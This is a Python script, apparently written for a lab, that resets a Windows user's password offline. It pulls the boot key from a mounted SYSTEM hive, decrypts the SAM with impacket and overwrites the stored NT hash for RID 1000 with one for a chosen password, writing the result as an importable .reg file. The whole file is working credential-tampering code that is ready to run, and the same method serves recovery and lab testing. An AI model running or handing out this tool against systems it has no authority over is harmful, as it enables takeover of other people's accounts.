#!/usr/bin/env python3
# sampset.py — set target's NT password offline by rewriting the SAM V value,
# reusing impacket's own SAM crypto (secretsdump.SAMHashes.__encryptHash).
# Output: /tmp/sam-v.reg (reged -I importable), plus debug layout info.
import sys, ntpath
from binascii import unhexlify, hexlify
sys.path.insert(0, '/usr/lib/python3/dist-packages/impacket/examples')
from impacket import ntlm, winregistry
import secretsdump as sd

SYS = '/mnt/tgt/Windows/System32/config/SYSTEM'
SAM = '/mnt/tgt/Windows/System32/config/SAM'
RID = 0x3e8                      # target (1000)
NEWPW = 'TargetLab1!'

# --- bootKey from SYSTEM hive (mirror of secretsdump LocalOperations.getBootKey) ---
wr = winregistry.get_registry_parser(SYS, False)
ccs = 'ControlSet%03d' % wr.getValue('\\Select\\Current')[1]
boot = b''
for k in ['JD', 'Skew1', 'GBG', 'Data']:
    cls = wr.getClass('\\%s\\Control\\Lsa\\%s' % (ccs, k))
    boot += cls[:16].decode('utf-16le').encode()
transforms = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]
boot = unhexlify(boot)
bk = b''.join(boot[t:t+1] for t in transforms)
print('bootKey:', hexlify(bk).decode())

# --- SAM crypto via impacket ---
sam = sd.SAMHashes(SAM, bk, isRemote=False)
sam.getHBootKey()
print('hboot ok')

key = 'SAM\\Domains\\Account\\Users\\%08X' % RID
Vraw = sam.getValue(ntpath.join(key, 'V'))[1]
ua = sd.USER_ACCOUNT_V(Vraw)
data = ua['Data']
noff, nlen = ua['NTHashOffset'], ua['NTHashLength']
field = data[noff:noff+nlen]
print('V len %d data len %d hdr %d | NT field off %d len %d' % (len(Vraw), len(data), len(Vraw)-len(data), noff, nlen))
print('orig field:', hexlify(field).decode())
enc = sd.SAM_HASH_AES(field)
print('parsed: PekID %x Revision %x DataOffset %d | Salt %d bytes | Hash(ct+pad) %d bytes' % (enc['PekID'], enc['Revision'], enc['DataOffset'], len(enc['Salt']), len(enc['Hash'])))

nt = ntlm.NTOWFv1(NEWPW)
print('target NT hash:', hexlify(nt).decode())
salt = enc['Salt']
encrypted = sam._SAMHashes__encryptHash(RID, nt, salt, b'NTPASSWORD\0', True)
print('encryptHash out len %d (ct32 expected)' % len(encrypted))
newfield = field[:8] + salt + encrypted
assert len(newfield) == len(field), 'field size mismatch %d vs %d' % (len(newfield), len(field))
hdr = len(Vraw) - len(data)
newV = Vraw[:hdr+noff] + newfield + Vraw[hdr+noff+len(field):]
assert len(newV) == len(Vraw)

hexbytes = hexlify(newV).decode()
# reg hex line: single line, comma-separated
line = ','.join(hexbytes[i:i+2] for i in range(0, len(hexbytes), 2))
with open('/tmp/sam-v.reg', 'w') as f:
    f.write('Windows Registry Editor Version 5.00\n\n')
    f.write('[HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\%08X]\n' % RID)
    f.write('"V"=hex:' + line + '\n')
print('WROTE /tmp/sam-v.reg (%d bytes V)' % len(newV))
